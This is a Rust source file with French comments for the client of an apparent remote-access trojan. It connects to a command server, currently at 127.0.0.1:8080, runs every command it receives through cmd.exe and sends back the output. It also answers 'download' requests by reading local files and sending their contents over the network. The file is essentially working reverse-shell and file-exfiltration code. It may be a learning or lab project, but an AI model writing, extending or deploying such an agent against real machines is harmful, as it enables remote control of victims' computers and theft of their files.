use tokio::net::TcpStream;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use std::error::Error;
use common::Message;
use std::process::Command;
use std::fs; // Pour lire les fichiers sur le disque

// Fonction existante pour cmd.exe
fn execute_cmd(cmd: &str) -> String {
    let output = Command::new("cmd").args(&["/C", cmd]).output();
    match output {
        Ok(o) => {
            let mut res = String::from_utf8_lossy(&o.stdout).to_string();
            if !o.stderr.is_empty() { res.push_str(&String::from_utf8_lossy(&o.stderr)); }
            if res.is_empty() { return "Effectué.".to_string(); }
            res
        },
        Err(e) => format!("Erreur: {}", e),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let server_addr = "127.0.0.1:8080";
    let stream = TcpStream::connect(server_addr).await?;
    let (read_half, mut write_half) = stream.into_split();
    let mut reader = BufReader::new(read_half);
    let mut line = String::new();

    loop {
        line.clear();
        let bytes = reader.read_line(&mut line).await?;
        if bytes == 0 { break; }

        let json = line.trim();
        if let Ok(message) = serde_json::from_str::<Message>(json) {
            match message {
                Message::Command(cmd) => {
                    // --- NOUVELLE LOGIQUE ---
                    if cmd.starts_with("download ") {
                        let filename = cmd.strip_prefix("download ").unwrap().trim();
                        println!("Demande de téléchargement pour : '{}'", filename); // Ajoute les guillemets pour voir s'il y a des espaces

                        match fs::read(filename) {
                            Ok(data) => {
                                println!("Fichier lu avec succès ({} octets). Envoi...", data.len()); // DEBUG
                                let msg = Message::File { 
                                    name: filename.to_string(), 
                                    content: data 
                                };
                                let mut json_resp = serde_json::to_string(&msg).unwrap();
                                json_resp.push('\n');
                                write_half.write_all(json_resp.as_bytes()).await?;
                                println!("Données envoyées sur le réseau."); // DEBUG
                            }
                            Err(e) => {
                                println!("ERREUR LECTURE FICHIER : {}", e); // DEBUG CRITIQUE
                                let err_msg = Message::Error(format!("Impossible de lire le fichier : {}", e));
                                let mut json_resp = serde_json::to_string(&err_msg).unwrap();
                                json_resp.push('\n');
                                write_half.write_all(json_resp.as_bytes()).await?;
                            }
                        }
                    } else {
                        // Commande normale (dir, whoami...)
                        let output_text = execute_cmd(&cmd);
                        let response = Message::Output(output_text);
                        let mut json_response = serde_json::to_string(&response).unwrap();
                        json_response.push('\n');
                        write_half.write_all(json_response.as_bytes()).await?;
                    }
                }
                _ => {}
            }
        }
    }
    Ok(())
}